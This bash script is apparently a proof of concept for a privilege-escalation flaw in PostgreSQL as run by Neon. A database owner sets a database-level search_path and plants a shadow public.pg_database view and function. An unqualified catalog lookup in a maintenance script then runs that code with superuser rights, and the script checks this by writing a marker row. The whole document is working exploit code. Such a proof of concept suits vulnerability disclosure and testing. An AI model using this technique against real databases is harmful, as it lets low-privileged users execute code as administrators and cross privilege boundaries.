#!/usr/bin/env bash
set -euo pipefail

HOST=127.0.0.1
PORT=5432

export PGPASSWORD=postgres
psql -h "$HOST" -p "$PORT" -U postgres -d postgres -v ON_ERROR_STOP=1 <<'SQL'
DROP DATABASE IF EXISTS victim;
DROP ROLE IF EXISTS cloud_admin;
DROP ROLE IF EXISTS app_owner;

CREATE ROLE cloud_admin LOGIN SUPERUSER PASSWORD 'admin';
CREATE ROLE app_owner LOGIN PASSWORD 'owner';
CREATE DATABASE victim OWNER app_owner;
SQL

psql -h "$HOST" -p "$PORT" -U postgres -d victim -v ON_ERROR_STOP=1 <<'SQL'
CREATE SCHEMA admin_secret AUTHORIZATION cloud_admin;
CREATE TABLE admin_secret.proof (
    actor pg_catalog.name NOT NULL,
    session_actor pg_catalog.name NOT NULL,
    note pg_catalog.text NOT NULL
);

REVOKE ALL ON SCHEMA admin_secret FROM PUBLIC;
REVOKE ALL ON TABLE admin_secret.proof FROM PUBLIC;

-- Neon makes the database owner the owner of public on modern PostgreSQL.
ALTER SCHEMA public OWNER TO app_owner;
GRANT USAGE, CREATE ON SCHEMA public TO app_owner;
SQL

export PGPASSWORD=owner
psql -h "$HOST" -p "$PORT" -U app_owner -d victim -v ON_ERROR_STOP=1 <<'SQL'
-- Database owners may persist database-level GUCs. Explicitly placing
-- pg_catalog after public makes public resolve first.
ALTER DATABASE victim SET search_path = public, pg_catalog;

CREATE OR REPLACE FUNCTION public.shadow_oid()
RETURNS pg_catalog.oid
LANGUAGE plpgsql
AS $$
BEGIN
    INSERT INTO admin_secret.proof(actor, session_actor, note)
    VALUES (
        pg_catalog.current_user,
        pg_catalog.session_user,
        'attacker-controlled pg_database view executed'
    );

    RETURN (
        SELECT oid
        FROM pg_catalog.pg_database
        WHERE datname OPERATOR(pg_catalog.=)
              pg_catalog.current_database()::pg_catalog.name
    );
END
$$;

CREATE VIEW public.pg_database
WITH (security_invoker = true)
AS
SELECT
    public.shadow_oid() AS oid,
    pg_catalog.current_database()::pg_catalog.name AS datname;
SQL

echo "[*] Proving app_owner cannot write to the admin-only marker directly..."
set +e
DIRECT_OUTPUT="$(
  psql -h "$HOST" -p "$PORT" -U app_owner -d victim     -v ON_ERROR_STOP=1     -c "INSERT INTO admin_secret.proof VALUES (current_user, session_user, 'direct');" 2>&1
)"
DIRECT_RC=$?
set -e

if [[ $DIRECT_RC -eq 0 ]]; then
  echo "[-] Unexpected: app_owner could write admin_secret.proof directly"
  exit 1
fi
echo "[+] Direct write correctly denied"

export PGPASSWORD=admin
SEARCH_PATH="$(
  psql -h "$HOST" -p "$PORT" -U cloud_admin -d victim -At     -v ON_ERROR_STOP=1 -c "SHOW search_path"
)"
echo "[*] cloud_admin search_path on fresh maintenance-style connection: $SEARCH_PATH"

if [[ "$SEARCH_PATH" != "public, pg_catalog" ]]; then
  echo "[-] Expected database-level search_path to apply to cloud_admin"
  exit 1
fi

echo "[*] Executing the still-unqualified scalar lookup from Neon's drop_subscriptions.sql..."
psql -h "$HOST" -p "$PORT" -U cloud_admin -d victim -v ON_ERROR_STOP=1 <<'SQL'
SELECT oid
FROM pg_database
WHERE datname OPERATOR(pg_catalog.=) 'victim'::pg_catalog.name;
SQL

MARKERS="$(
  psql -h "$HOST" -p "$PORT" -U cloud_admin -d victim -At     -v ON_ERROR_STOP=1     -c "SELECT pg_catalog.count(*) FROM admin_secret.proof WHERE actor OPERATOR(pg_catalog.=) 'cloud_admin'::pg_catalog.name;"
)"

echo "[*] privileged marker rows: $MARKERS"
if [[ "$MARKERS" -lt 1 ]]; then
  echo "[-] Shadow object did not execute with cloud_admin privileges"
  exit 1
fi

echo "[+] PASS: unqualified pg_database resolves to attacker-controlled public.pg_database"
echo "[+] PASS: attacker-controlled function executed as cloud_admin and crossed the privilege boundary"
